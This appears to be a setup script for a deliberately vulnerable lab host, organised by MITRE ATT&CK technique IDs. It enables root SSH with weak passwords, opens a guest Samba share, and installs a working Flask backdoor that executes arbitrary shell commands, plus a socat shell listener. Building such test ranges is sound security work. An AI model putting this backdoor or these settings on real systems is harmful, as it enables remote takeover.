############### OPERATION MIDNIGHT ECLIPSE

#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 

# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &

################################################ End of Global Section
# T1005

mkdir -p /home/attacker/.config/google-chrome/Default
printf 'cookie1=value1; cookie2=value2' > /home/attacker/.config/google-chrome/Default/Cookies
chown -R attacker:attacker /home/attacker/.config

# T1078.002
apt-get install -y samba samba-common-bin
printf '[global]\n   workgroup = WORKGROUP\n   server string = Samba Server\n   netbios name = debianA\n   security = user\n   map to guest = Bad User\n\n[share]\n   path = /srv/samba/share\n   browsable =yes\n   writable = yes\n   guest ok = yes\n   read only = no\n' > /etc/samba/smb.conf
mkdir -p /srv/samba/share
chmod -R 0777 /srv/samba/share
printf '#!/bin/sh\necho "This is a fake Windows Defend service file"\nsleep infinity\n' > /srv/samba/share/fake_service.sh
chmod +x /srv/samba/share/fake_service.sh
pgrep -x "smbd" > /dev/null || /usr/sbin/smbd --no-process-group --foreground &

useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

#T1090
pip3 install --break-system-packages flask flask-cors requests
mkdir -p /home/attacker/malware
cat > /home/attacker/malware/backdoor.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if not cmd:
  return "No command", 400
 try:
  output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
  return output
 except Exception as e:
  return str(e), 500
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5055)
EOF
chown attacker:attacker /home/attacker/malware/backdoor.py
chmod +x /home/attacker/malware/backdoor.py

if ! ss -tuln | grep -q ":5055 "; then
 su attacker -c "python3 /home/attacker/malware/backdoor.py &"
 else echo "Port 5055 already in use";
fi

# T1559
apt-get install -y socat
cat > /root/ipc_server.sh << 'EOF'
#!/bin/sh
while true; do socat UNIX-LISTEN:/tmp/mysocket,fork EXEC:/bin/sh; done &
EOF
chmod +x /root/ipc_server.sh
/root/ipc_server.sh &

# T1071.001
# done

# T1584.003 
cat > /tmp/payload.sh << 'EOF'
#!/bin/bash
echo "PAYLOAD EXECUTED"
id
ps aux | head -5
EOF

# T1053.005
cat >> /var/www/html/backdor.sh << 'EOF'
#!/bin/bash
echo "if I wanted"
EOF

# T1584.006
apt-get install -y unzip
pip install --break-system-packages boto3
curl -fsSL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/awscliv2.zip
unzip -o /tmp/awscliv2.zip -d /tmp
/tmp/aws/install --update
mkdir -p /home/attacker/.aws
cat <<EOF > /home/attacker/.aws/credentials
[default]
aws_access_key_id = AKIAFAKEKEYEXAMPLE
aws_secret_access_key = FakeSecretKeyExample1234567890
region = us-east-1
EOF
chown -R attacker:attacker /home/attacker/.aws
cat <<EOF > /home/attacker/.aws/config
[default]
region=us-east-1
EOF
chown attacker:attacker /home/attacker/.aws/config


################################